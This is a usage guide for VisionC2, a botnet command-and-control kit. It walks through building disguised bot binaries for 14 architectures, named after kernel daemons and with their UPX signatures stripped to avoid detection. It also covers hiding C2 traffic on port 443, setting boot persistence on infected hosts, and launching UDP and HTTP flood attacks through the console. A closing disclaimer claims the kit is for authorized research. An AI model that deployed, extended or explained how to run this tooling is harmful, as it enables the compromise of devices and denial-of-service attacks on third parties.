# ☾℣☽ VisionC2 Usage Guide

> Complete guide for setup, configuration, and operation of VisionC2.

---

## 📑 Table of Contents

- [Prerequisites](#-prerequisites)
- [Building from Scratch](#-building-from-scratch)
- [Changing C2 Address](#-changing-c2-address)
- [Connecting to CNC Portal](#-connecting-to-cnc-portal)
- [Managing Bots](#-managing-bots)
- [Running Attacks](#-running-attacks)
- [Rebuilding Bots Only](#-rebuilding-bots-only)
- [TLS Certificates](#-tls-certificates)
- [Troubleshooting](#-troubleshooting)

---

## 📋 Prerequisites

Before setting up VisionC2, ensure you have the following installed:

```bash
# Install required packages
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat

# Install Go 1.23+ (required)
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 512MB | 2GB+ |
| Storage | 1GB | 5GB+ |
| OS | Linux (any distro) | Ubuntu 22.04+ / Debian 12+ |
| Network | Open port 443 (bots) | + Admin port (default 420) |

---

## 🚀 Building from Scratch

### Step 1: Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
```

### Step 2: Run the Setup Wizard

```bash
python3 setup.py
```

### Step 3: Setup Menu Options

```
╔════════════════════════════════════════════════════════════╗
║                    Setup Options                            ║
╠════════════════════════════════════════════════════════════╣
║  [1] Full Setup     - Complete fresh installation           ║
║  [2] Update C2 URL  - Change C2 address only                ║
║  [0] Exit                                                   ║
╚════════════════════════════════════════════════════════════╝
```

**Choose Option [1] for fresh install.**

### Step 4: Configuration Prompts

The wizard will ask for:

| Prompt | Description | Example |
|--------|-------------|---------|
| **C2 Address** | Domain or IP where bots connect | `c2.example.com` or `192.168.1.100` |
| **Admin Port** | Port for admin console connections | `420` (default) |
| **Certificate Details** | For TLS cert generation | Country, State, City, Org |

### Step 5: Automatic Generation

The wizard automatically generates:

- ✅ **Magic Code** - 16-char random authentication token
- ✅ **Protocol Version** - Random version string (e.g., `r5.6-stable`)
- ✅ **Crypt Seed** - 8-char hex encryption seed
- ✅ **TLS Certificates** - 4096-bit RSA key + self-signed cert
- ✅ **Obfuscated C2** - Multi-layer encrypted C2 address

### Step 6: Build Output

After completion, you'll have:

```
VisionC2/
├── cnc/
│   ├── cnc              # CNC server binary
│   ├── server.crt       # TLS certificate
│   └── server.key       # TLS private key
├── bot/
│   └── bins/            # 14 bot binaries (different architectures)
│       ├── kworkerd0    # x86 (386)
│       ├── ethd0        # x86_64 (amd64)
│       ├── mdsync1      # ARMv7
│       ├── ip6addrd     # ARM64
│       └── ...          # + 10 more architectures
└── setup_config.txt     # Your configuration summary
```

### Configuration File

After setup, check `setup_config.txt` for your configuration:

```
============================================================
VisionC2 Configuration
============================================================

[C2 Server]
C2 Address: c2.example.com:443
Admin Port: 420
Bot Port: 443

[Security]
Magic Code: IhxWZGJDzdSviX$s
Protocol Version: r5.6-stable

[Usage]
1. Start CNC: cd cnc && ./cnc
2. Connect Admin: nc c2.example.com 420
3. Login trigger: spamtec
4. Bot binaries: bot/bins/
```

---

## 🔄 Changing C2 Address

If you need to change your C2 address (new server, domain change, etc.):

### Method 1: Setup Wizard (Recommended)

```bash
cd VisionC2
python3 setup.py
# Select option [2] - Update C2 URL
```

This will:

- ✅ Re-encrypt the new C2 address with existing crypt seed
- ✅ Update bot source code
- ✅ Rebuild all 14 bot architectures
- ✅ Keep your existing magic code and protocol version

### Method 2: Full Rebuild

If you also want new security tokens:

```bash
python3 setup.py
# Select option [1] - Full Setup
```

This regenerates everything including:

- New magic code
- New protocol version
- New crypt seed
- New TLS certificates

### Important Notes

> ⚠️ **After changing C2 address, you MUST redeploy bot binaries.**
> Old bots will continue trying to connect to the previous C2.

> ⚠️ **The bot port (443) is fixed and cannot be changed.**
> This is intentional - port 443 blends with normal HTTPS traffic.

---

## 🖥️ Connecting to CNC Portal

### Step 1: Start the CNC Server

```bash
cd VisionC2/cnc

# Option A: Run in foreground (for testing)
./cnc

# Option B: Run in screen session (recommended for production)
screen -S cnc ./cnc

# To detach from screen: Ctrl+A, then D
# To reattach: screen -r cnc
```

### Step 2: Server Output

When started, you'll see:

```
[INFO] Loading TLS certificates...
[INFO] TLS configuration loaded successfully
[☾℣☽] Bot TLS server starting on 0.0.0.0:443
[☾℣☽] Bot TLS server is running on port 443
[AUTH] Using magic code authentication: IhxWZGJDzdSviX$s
[☾℣☽] Admin CLI server starting on 0.0.0.0:420
```

### Step 3: Connect to Admin Console

From another terminal (can be local or remote):

```bash
# Using netcat
nc YOUR_SERVER_IP 420

# Or using telnet
telnet YOUR_SERVER_IP 420
```

### Step 4: Authenticate

1. **Type the trigger word:**

   ```
   spamtec
   ```

2. **Enter credentials:**

   ```
   ► Authentication -- Required
   ☉ Username: root
   ☉ Password: [your password]
   ```

3. **First-time login:**
   - On first run, a random password is generated
   - Check server console output for: `[☾℣☽] Login with username root and password XXXXXX`

### Step 5: You're In

After successful login, you'll see the VisionC2 banner and prompt:

```
              ☾ V I S I O N ℣ C 2
              ├─────────────────────────┤
              │ ● Status: ONLINE        │
              │ ◈ Bots: 47              │
              │ ◈ Proto: r5.6-stable    │
              │ ◈ Encrypt: TLS 1.3      │

✅ Authentication Successful | Level: Owner

[Owner@root]► 
```

### Quick Commands After Login

```bash
help              # Show command menu
attack            # Show attack methods
bots              # List connected bots
?                 # Quick help hint
```

---

## 🤖 Managing Bots

### Deploying Bots

Bot binaries are in `bot/bins/`. Deploy the correct binary for each target architecture:

Here’s a **full, clean, expanded list** of all architectures in table form, based on your mapping, suitable for docs or README reference:

| Binary Name | Architecture | GOOS  | GOARCH   | GOARM | Comments                             |
| ----------- | ------------ | ----- | -------- | ----- | ------------------------------------ |
| kworkerd0   | x86 (386)    | linux | 386      |       | 32-bit Intel/AMD                     |
| ethd0       | x86_64       | linux | amd64    |       | 64-bit Intel/AMD                     |
| mdsync1     | ARMv7        | linux | arm      | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)     |
| ksnapd0     | ARMv5        | linux | arm      | 5     | ARM 32-bit v5 (older ARM)            |
| kswapd1     | ARMv6        | linux | arm      | 6     | ARM 32-bit v6 (Raspberry Pi 1)       |
| ip6addrd    | ARM64        | linux | arm64    |       | ARM 64-bit (Raspberry Pi 4, Android) |
| deferwqd    | MIPS         | linux | mips     |       | MIPS big-endian (routers)            |
| devfreqd0   | MIPSLE       | linux | mipsle   |       | MIPS little-endian                   |
| kintegrity0 | MIPS64       | linux | mips64   |       | MIPS 64-bit big-endian               |
| biosd0      | MIPS64LE     | linux | mips64le |       | MIPS 64-bit little-endian            |
| kpsmoused0  | PPC64        | linux | ppc64    |       | PowerPC 64-bit big-endian            |
| ttmswapd    | PPC64LE      | linux | ppc64le  |       | PowerPC 64-bit little-endian         |
| vredisd0    | s390x        | linux | s390x    |       | IBM System/390 64-bit                |
| kvmirqd     | RISC-V 64    | linux | riscv64  |       | RISC-V 64-bit                        |

---

### Bot Connection Flow

```
Bot starts → Decrypts C2 address → TLS handshake (port 443)
    → Challenge-response auth → Registration → Ready for commands
```

### Monitoring Bots

```bash
[Owner@root]► bots
[Bots: 47]
Connected Bots:
──────────────────────────────────────
  ID: a1b2c3d4 | IP: 192.168.1.100:45231 | Arch: amd64 | RAM: 4.0GB
      Uptime: 2h15m30s | Last: 5s
```

### Bot Management Commands

| Command | Description | Level |
|---------|-------------|-------|
| `!info` | Request system info from all bots | Admin+ |
| `!persist` | Setup boot persistence | Admin+ |
| `!reinstall` | Force bot re-download/reinstall | Admin+ |
| `!lolnogtfo` | Kill and remove bot | Admin+ |

---

## ⚡ Running Attacks

### View Attack Methods

```bash
[Owner@root]► attack
```

### Attack Syntax

```
!<method> <target> <port> <duration> [-p <proxy_url>]
```

### Examples

```bash
# Layer 4 - UDP flood
!udpflood 192.168.1.100 80 60

# Layer 7 - HTTPS flood
!https example.com 443 120

# Layer 7 with proxy
!http target.com 443 60 -p https://proxylist.com/proxies.txt

# Stop all attacks
!stop
```

### Monitor Ongoing Attacks

```bash
[Owner@root]► ongoing
Ongoing Attacks:
  !udpflood -> 192.168.1.1:80 (45s remaining)
  !http -> example.com:443 (2m30s remaining)
```

---

## 🔨 Rebuilding Bots Only

If you only need to rebuild bot binaries (no configuration changes):

```bash
cd VisionC2/bot
./build.sh
```

This will:

- Compile for all 14 architectures
- Apply UPX compression
- Strip UPX signatures (anti-detection)
- Output to `bot/bins/`

### Build Output

```
Building for x86 (386)...
Building for x86_64...
Building for ARMv7...
...
All 14 builds complete!
Built binaries saved to ./bins/:
-rwxr-xr-x 1 root root 892K kworkerd0
-rwxr-xr-x 1 root root 956K ethd0
...
Stripping UPX signatures from binaries...
UPX signatures stripped successfully!
```

---

## 🔒 TLS Certificates

### Default Certificate Location

```
VisionC2/cnc/
├── server.crt    # Public certificate
└── server.key    # Private key (keep secure!)
```

### Regenerating Certificates

```bash
# Option 1: Via setup wizard
python3 setup.py
# Select [1] Full Setup

# Option 2: Manual generation
cd VisionC2/cnc
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

### Using Let's Encrypt (Production)

For production with a real domain:

```bash
# Install certbot
sudo apt install certbot

# Generate certificate
sudo certbot certonly --standalone -d c2.yourdomain.com

# Copy to cnc directory
sudo cp /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem cnc/server.crt
sudo cp /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem cnc/server.key
```

---

## 🔧 Troubleshooting

### CNC Server Won't Start

**Error:** `Failed to load TLS certificates`

```bash
# Check certificate files exist
ls -la cnc/server.crt cnc/server.key

# Regenerate if missing
cd cnc
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

**Error:** `Error starting bot TLS server: bind: permission denied`

```bash
# Port 443 requires root
sudo ./cnc

# Or use capabilities (preferred)
sudo setcap 'cap_net_bind_service=+ep' ./cnc
./cnc
```

### Bots Not Connecting

1. **Check firewall:**

   ```bash
   sudo ufw allow 443/tcp
   sudo ufw allow YOUR_ADMIN_PORT/tcp
   ```

2. **Verify C2 address:**

   ```bash
   # Check what bots are trying to connect to
   cat setup_config.txt | grep "C2 Address"
   ```

3. **Check DNS resolution (if using domain):**

   ```bash
   nslookup c2.yourdomain.com
   ```

4. **Test TLS connectivity:**

   ```bash
   openssl s_client -connect YOUR_SERVER:443
   ```

### Can't Connect to Admin Console

1. **Check server is running:**

   ```bash
   ps aux | grep cnc
   netstat -tlnp | grep YOUR_ADMIN_PORT
   ```

2. **Check firewall:**

   ```bash
   sudo ufw allow YOUR_ADMIN_PORT/tcp
   ```

3. **Verify connection:**

   ```bash
   nc -zv YOUR_SERVER_IP YOUR_ADMIN_PORT
   ```

### Forgot Password

The root password is shown on first CNC startup. If lost:

1. Delete `users.json` in the cnc directory
2. Restart CNC server
3. New random password will be generated

```bash
cd cnc
rm users.json
./cnc
# Look for: [☾℣☽] Login with username root and password XXXXXX
```

### Build Errors

**Error:** `go: command not found`

```bash
# Add Go to PATH
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

**Error:** `upx: command not found`

```bash
sudo apt install upx-ucl
```

---

## 📚 Additional Resources

- [Command Reference](cnc/COMMANDS.md) - Full command documentation
- [Changelog](CHANGELOG.md) - Version history and updates
- [README](README.md) - Project overview

---

## ⚖️ Legal Disclaimer

VisionC2 is for **authorized security research only**. Users must:

1. Obtain written permission before testing any systems
2. Only use on systems they own or have explicit authorization to test
3. Comply with all applicable laws and regulations
4. Not use for malicious purposes

The developers assume no liability for misuse.
